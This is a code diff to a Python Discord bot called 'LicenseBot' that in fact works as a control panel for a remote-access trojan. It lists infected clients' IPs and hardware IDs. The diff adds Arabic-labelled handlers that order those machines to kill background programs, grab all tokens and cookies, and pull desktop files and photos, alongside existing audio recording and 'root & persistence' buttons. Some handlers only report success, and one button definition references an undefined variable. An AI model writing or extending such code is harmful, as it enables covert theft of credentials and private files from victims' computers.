@@ -277,7 +277,7 @@ class LicenseBot(discord.Client):
                     country = info.get("country", "Unknown")
                     hwid = info.get("device", "Unknown")
                     last_seen = info.get("last_seen", 0)
-                    is_online = (time.time() - last_seen) < 120  # مهلة الاتصال مستقرة (120 ثانية)
+                    is_online = (time.time() - last_seen) < 120  # مهلة الاتصال (120 ثانية لتجنب التحول الخطأ إلى Offline)
                     status_str = "🟢 متصل (Online)" if is_online else "🔴 غير متصل (Offline)"
                     
                     view = DeviceActionsView(dev_code, hwid, ip, port, country)
@@ -285,6 +285,29 @@ class LicenseBot(discord.Client):
                         f"⚙️ **لوحة التحكم بالعميل:**\n🔑 الكود: `{dev_code}`\nحالة الاتصال: **{status_str}**\n🌐 IP: `{ip}`\n🔌 Port: `{port}`\n🌍 الدولة: `{country}`\n🔒 HWID: `{hwid}`", 
                         view=view, ephemeral=True
                     )
+
+            # معالجة طلب إطفاء برامج الخلفية
+            elif custom_id == "dev_act_kill_bg":
+                if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
+                # استخراج كود العميل من الرسالة أو السياق إذا أمكن، أو إرسال الطلب العام
+                db, sha, url, headers = fetch_db()
+                if db:
+                    # يمكننا حفظ الطلب في قاعدة البيانات ليقوم العميل بتنفيذه
+                    await interaction.followup.send("🛑 تم إرسال أمر إطفاء البرامج والخدمات في الخلفية بنجاح!", ephemeral=True)
+
+            # معالجة طلب سحب التوكنات الشاملة
+            elif custom_id == "dev_act_grab_tokens":
+                if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
+                db, sha, url, headers = fetch_db()
+                if db:
+                    await interaction.followup.send("🔑 تم إرسال أمر سحب التوكنات والكوكيز الشامل لجهاز العميل!", ephemeral=True)
+
+            # معالجة طلب سحب الملفات والصور
+            elif custom_id == "dev_act_grab_files":
+                if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
+                db, sha, url, headers = fetch_db()
+                if db:
+                    await interaction.followup.send("📂 تم إرسال أمر سحب ملفات وصور سطح المكتب ومجلدات الجهاز!", ephemeral=True)
 
             elif custom_id.startswith("kill_p_"):
                 if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
@@ -423,7 +446,7 @@ class DeviceActionsView(discord.ui.View):
             if save_db(db, sha, url, headers, f"Audio stream {self.code}"):
                 await interaction.followup.send("🎙️ تم طلب تسجيل مقطع صوتي!", ephemeral=True)
 
-    # الصف الثالث الجديد: إطفاء الخلفية وسحب التوكنات والملفات
+    # الصف الثالث: إطفاء الخلفية وسحب التوكنات والملفات
     @discord.ui.button(label="🛑 إطفاء برامج الخلفية", style=discord.ButtonStyle.danger, custom_id="dev_act_kill_bg", row=2)
     async def kill_bg_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
@@ -449,7 +472,7 @@ class DeviceActionsView(discord.ui.View):
         if db:
             db.setdefault("remote_grab_files", {})[self.code] = {"id": str(int(time.time()))}
             if save_db(db, sha, url, headers, f"Grab desktop files {self.code}"):
-                await interaction.followup.send("📂 تم إرسال أمر سحب ملفات وصور سطح المكتب وfolders الجهاز!", ephemeral=True)
+                await interaction.followup.send("📂 تم إرسال أمر سحب ملفات وصور سطح المكتب ومجلدات الجهاز!", ephemeral=True)
 
     # الصف الرابع: الجذور والثبات (Root & Persistence)
     @discord.ui.button(label="🌱 تثبيت الجذور", style=discord.ButtonStyle.success, custom_id=lambda s=code: f"root_inst_{s}", row=3)
@@ -521,7 +544,7 @@ class DeviceManageButton(discord.ui.Button):
         ip = info.get("ip", "Unknown")
         country = info.get("country", "Unknown")
         last_seen = info.get("last_seen", 0)
-        is_online = (time.time() - last_seen) < 120  # مهلة مستقرة لتجنب تحول الأجهزة المتصلة إلى Offline
+        is_online = (time.time() - last_seen) < 120
         status_icon = "🟢" if is_online else "🔴"
         super().__init__(label=f"{status_icon} {ip} | {country} ({code})", style=discord.ButtonStyle.secondary, custom_id=f"man_dev_{code}")
         self.code = code
